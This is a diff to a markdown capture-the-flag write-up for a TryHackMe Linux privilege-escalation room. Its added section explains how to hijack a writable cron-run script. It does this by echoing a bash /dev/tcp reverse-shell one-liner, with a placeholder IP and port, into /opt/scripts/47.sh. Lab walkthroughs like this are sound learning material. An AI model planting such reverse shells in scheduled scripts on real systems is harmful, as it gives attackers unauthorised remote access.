@@ -51,7 +51,7 @@ writ up: https://waqar-arain.netlify.app/tryhackme/linux-agency/
 		```
 - ***(Mission 14,15,16)*** Use [Cyber Chef👨‍🍳](https://gchq.github.io/CyberChef/) to solve them.
 - ***Tools*** [RevShell](https://www.revshells.com/)
-- ***(Mission 16)*** it was a fucking compiled sh file just run the damn script!!! -it was a note screaming to myself-
+- ***(Mission 16)*** it was a fucking compiled sh file just run the damn script!!! -it was a note screaming at myself-
 - ***(Mission 17,18,19,20)*** use the right compiler to run the language
 - ***(Mission 21)*** he spawned you into an `/bin/sh` try to get back to `/bin/bash`
 - ***(Mission 22)*** he spawned you into a python interpreter try to open the `/bin/bash` form it
@@ -93,3 +93,26 @@ writ up: https://waqar-arain.netlify.app/tryhackme/linux-agency/
 	```
 
 # Task 4
+
+#### Diana's flag
+
+*Well this flag is related to a scheduled process of it happens it executes an `sh` file that you have a read and write permissions on, so the way to get this flag is to put a `bash` reverse shell script in that file and listen till it runs and you get to the shell that has the flag.*
+- [Bash Rev-shell scripts](https://gtfobins.github.io/gtfobins/bash/)
+
+So, the **first** thing is to find where the script is, there are two ways:
+
+##### The hard and luck based way 
+
+lets search for it by the `find` command by searching for all the files that `Viktor` owns, and the `47.sh` is the target file.
+
+```bash
+find / -user viktor 2>dev/null | grep .sh
+```
+
+Now lets put the `bash` reverse shell script in the file, which you can get from: [GTFobins](https://gtfobins.github.io/gtfobins/bash/)
+
+```bash
+echo "bash -c 'exec bash -i &>/dev/tcp/{IP}/{port} <&1'" > /opt/scripts/47.sh
+```
+
+And wait till the scheduled process runs the script file.  
